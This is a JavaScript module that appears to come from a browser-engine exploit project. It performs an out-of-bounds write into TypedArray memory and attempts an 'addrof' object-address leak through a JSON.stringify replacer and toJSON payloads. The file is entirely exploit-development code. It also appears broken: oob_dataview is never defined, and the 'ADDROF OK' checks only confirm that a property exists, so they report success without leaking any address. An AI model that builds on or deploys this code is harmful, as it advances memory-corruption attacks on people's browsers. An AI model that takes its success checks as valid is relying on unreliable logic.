import { triggerOOB_primitive } from "./core/CoreExploit.mjs";
import { log, logHeader, logAlert } from "./utils/logger.mjs";

let global_leaky_wrapper = {};

export async function runHeisenbugReproStrategy_TypedArrayVictim_LeakObjectsViaConfusedDetailsObject() {
  logHeader("==== INICIANDO Estratégia de Reprodução do Heisenbug (LeakObjectsViaConfusedDetailsObject) ====");

  const OOB_OK = triggerOOB_primitive({ force_reinit: true });
  if (!OOB_OK) {
    logAlert("OOB setup falhou. Abortando.");
    return;
  }

  log("--- Initiating Heisenbug & Addrof ---");

  // Corrupção real: offset baseado em m_vector (ajustável)
  const OOB_WRITE_OFFSET = 0x7c;
  oob_dataview.setUint32(OOB_WRITE_OFFSET, 0x41414141, true); // Simula corrupção de ponteiro

  log(`  Critical OOB write to 0x${OOB_WRITE_OFFSET.toString(16).padStart(4, '0')} performed.`);

  // Step 2: Cria TypedArray vítima
  const victim_typed_array_ref_v37 = new Uint8Array(16);
  log("STEP 2: victim_typed_array_ref_v37 (Uint8Array) created.");

  let callCounter = 0;
  let stringifyOutput = null;

  function TA_Probe_Addrof_v38_LeakObjectsViaC1(thisArg) {
    callCounter++;

    const isVictim = thisArg instanceof Uint8Array;
    const isC1DetailsObj = thisArg && thisArg.generic_marker_v37 === 1337;

    log(`Call #${callCounter}. 'this' type: ${Object.prototype.toString.call(thisArg)}. IsVictim? ${isVictim}. IsC1DetailsObj? ${isC1DetailsObj}`);

    try {
      if (isVictim) {
        const c1 = {
          generic_marker_v37: 1337,
          call_number: callCounter,
          probe_variant: "TA_Probe_Addrof_v38_LeakObjectsViaC1",
          this_type: Object.prototype.toString.call(thisArg),
          this_is_victim: true,
          this_is_C1_details_obj: false,
          payload_A_assigned_to_C1_this: false,
          payload_B_assigned_to_C1_this: false,
          error_in_probe: null
        };

        return c1;

      } else if (isC1DetailsObj) {
        // Fase crítica de confusão: adiciona payloads leaky
        const leak_probe = {};

        Object.defineProperty(leak_probe, "toJSON", {
          get() {
            log("[+] PAYLOAD A leak_probe.toJSON getter triggered!");
            return function () {
              log("[+] PAYLOAD A toJSON() called!");
              return "[LEAK_A]";
            };
          },
          configurable: true
        });

        const leak_probe_B = {
          toJSON() {
            log("[+] PAYLOAD B toJSON() called!");
            return "[LEAK_B]";
          }
        };

        thisArg.payload_A = leak_probe;
        thisArg.payload_B = leak_probe_B;
        thisArg.payload_A_assigned_to_C1_this = true;
        thisArg.payload_B_assigned_to_C1_this = true;

        // Armazena globalmente para garantir persistência
        global_leaky_wrapper.last_confused = thisArg;

        log(`Call #${callCounter}: Confusão TYPE DETECTADA. Leaky payloads atribuídos.`);
        return thisArg;
      }

      log(`Call #${callCounter}: 'this' é genérico. Type: ${Object.prototype.toString.call(thisArg)}`);
      return { recursion_stopped_v37: true, call: callCounter };

    } catch (e) {
      return {
        error_in_probe: e.message,
        call_number: callCounter
      };
    }
  }

  const objForJSON = {
    first: victim_typed_array_ref_v37,
    second: victim_typed_array_ref_v37,
    third: victim_typed_array_ref_v37
  };

  try {
    stringifyOutput = JSON.stringify(objForJSON, TA_Probe_Addrof_v38_LeakObjectsViaC1);
    log(`JSON.stringify completed. Output: ${stringifyOutput}`);
  } catch (e) {
    logAlert(`Erro durante JSON.stringify: ${e}`);
  }

  let parsedOutput;
  try {
    parsedOutput = JSON.parse(stringifyOutput);
  } catch (e) {
    logAlert(`Erro no parse do output do stringify: ${e}`);
  }

  const c1_details_final = global_leaky_wrapper.last_confused;

  log("EXECUTE: Captured state of C1_details object AFTER all probe calls:");
  log(JSON.stringify(c1_details_final || {}, null, 2));

  if (
    c1_details_final &&
    typeof c1_details_final.payload_A !== "undefined"
  ) {
    log("[✓] ADDROF A (payload_A): OK (payload_A presente)");
  } else {
    logAlert("ADDROF A (payload_A): FALHOU: payload_A ausente ou não acessado");
  }

  if (
    c1_details_final &&
    typeof c1_details_final.payload_B !== "undefined"
  ) {
    log("[✓] ADDROF B (payload_B): OK (payload_B presente)");
  } else {
    logAlert("ADDROF B (payload_B): FALHOU: payload_B ausente ou não acessado");
  }

  logHeader("==== Estratégia de Reprodução do Heisenbug (LeakObjectsViaConfusedDetailsObject) CONCLUÍDA ====");
}
